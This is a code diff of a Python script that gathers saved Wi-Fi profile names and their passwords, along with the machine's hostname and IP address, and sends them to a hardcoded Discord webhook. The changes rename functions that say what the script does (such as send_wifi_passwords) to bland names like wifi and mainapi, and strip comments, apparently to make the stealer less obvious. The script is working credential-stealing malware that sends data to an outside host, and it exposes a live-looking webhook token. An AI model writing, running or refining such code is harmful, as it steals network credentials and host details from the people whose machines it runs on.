@@ -3,7 +3,6 @@ import re
 import requests
 import socket
 
-# Your Discord webhook URL — keep it safe!
 WEBHOOK_URL = "https://discord.com/api/webhooks/1336151237124690092/Gtm2kbpv5grLeF-nMXpEMWQYE_kKxVtt0_PEn62rYZzzmEbD02g3nqGR6eGt2uRNL-7Z"
 
 def get_profiles():
@@ -32,7 +31,7 @@ def send_to_discord(message):
     except Exception as e:
         print(f"Error sending webhook: {e}")
 
-def send_wifi_passwords():
+def wifi():
     profiles = get_profiles()
     if not profiles:
         print("No Wi-Fi profiles found.")
@@ -43,19 +42,18 @@ def send_wifi_passwords():
         password = get_password(profile.strip())
         message += f"{profile.strip()}: {password}\n"
 
-    # Discord message limit is 2000 chars, so chunk if needed
     for i in range(0, len(message), 1900):
         send_to_discord(message[i:i+1900])
 
-def send_ip_info():
+def ipname():
     hostname = socket.gethostname()
     ip_address = socket.gethostbyname(hostname)
-    message = f"📡 IP Address: `{ip_address}` from `{hostname}`"
+    message = f"IP Address: `{ip_address}` from `{hostname}`"
     send_to_discord(message)
 
-def main():
-    send_wifi_passwords()
-    send_ip_info()
+def mainapi():
+    wifi()
+    ipname()
 
 if __name__ == "__main__":
-    main()
+    mainapi()
